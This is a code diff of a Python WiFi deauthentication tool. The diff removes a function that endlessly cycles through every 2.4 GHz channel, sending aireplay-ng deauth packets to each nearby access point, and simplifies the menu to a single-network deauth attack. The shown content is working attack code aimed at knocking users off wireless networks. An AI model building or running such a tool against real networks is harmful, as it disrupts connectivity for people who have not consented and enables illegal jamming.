@@ -22,7 +22,7 @@ def print_banner():
  ##:::: ##: ##:::. ##: ########:. #######:: ##:::: ##: ##:::: ##:. ######:: ##::. ##:
 ..:::::..::..:::::..::........:::.......:::..:::::..::..:::::..:::......:::..::::..::
 .....................................................................................
-DEVELOPED BY ATHUL                                              WIFI DEAUTHER VER 2.0
+DEVELOPED BY ATHUL                                    WIFI DEAUTHER VER 1.0 (2.4 GHZ)
 .....................................................................................
 """
     print(banner)
@@ -97,43 +97,6 @@ def scan_networks_live(interface):
     finally:
         process.terminate()
 
-def deauth_all_24ghz(interface):
-    """Fast deauthentication of all 2.4 GHz networks."""
-    print("Optimized deauthentication of all 2.4 GHz networks...")
-    
-    # Group networks by channel
-    networks_by_channel = {}
-    for network in networks:
-        channel = int(network["channel"])
-        if 1 <= channel <= 14:  # 2.4 GHz channels range
-            if channel not in networks_by_channel:
-                networks_by_channel[channel] = []
-            networks_by_channel[channel].append(network)
-
-    try:
-        while True:
-            for channel, channel_networks in networks_by_channel.items():
-                # Switch to the channel
-                subprocess.run(["iwconfig", interface, "channel", str(channel)], stdout=subprocess.DEVNULL)
-                print(f"\nDeauthenticating on Channel {channel}...")
-                
-                for network in channel_networks:
-                    print(f"  Sending deauth packets to BSSID: {network['bssid']} (ESSID: {network['essid']})")
-                    try:
-                        # Send deauth packets
-                        subprocess.run(
-                            ["aireplay-ng", "--deauth", "3", "-a", network["bssid"], interface],
-                            stdout=subprocess.DEVNULL,
-                            stderr=subprocess.DEVNULL
-                        )
-                    except Exception as e:
-                        print(f"Error deauthenticating {network['bssid']}: {e}")
-            
-            print("Completed one cycle of deauth attacks on all channels. Repeating...")
-    except KeyboardInterrupt:
-        print("\nDeauthentication attack stopped.")
-
-
 def deauth_attack(interface, bssid, channel):
     """Perform a deauthentication attack."""
     print(f"Setting interface to channel {channel}...")
@@ -198,33 +161,17 @@ def main():
     # Live scan networks
     scan_networks_live(selected_interface)
 
-    # User selects action
-    print("\nOptions:")
-    print("1: Deauth a specific network")
-    print("2: Deauth all 2.4 GHz networks (EXPERIMENTAL)")
+    # Select network
     while True:
         try:
-            option = int(input("Choose an option: "))
-            if option == 1:
-                # Select a network
-                while True:
-                    try:
-                        choice = int(input("Select a network to deauth by index: "))
-                        target = networks[choice]
-                        break
-                    except (ValueError, IndexError):
-                        print("Invalid choice. Try again.")
-                # Perform deauth
-                deauth_attack(selected_interface, target["bssid"], target["channel"])
-                break
-            elif option == 2:
-                # Deauth all 2.4 GHz networks
-                deauth_all_24ghz(selected_interface)
-                break
-            else:
-                print("Invalid option. Try again.")
-        except ValueError:
-            print("Invalid input. Try again.")
+            choice = int(input("Select a network to deauth by index: "))
+            target = networks[choice]
+            break
+        except (ValueError, IndexError):
+            print("Invalid choice. Try again.")
+
+    # Perform deauth attack
+    deauth_attack(selected_interface, target["bssid"], target["channel"])
 
     # Cleanup temporary files
     cleanup()
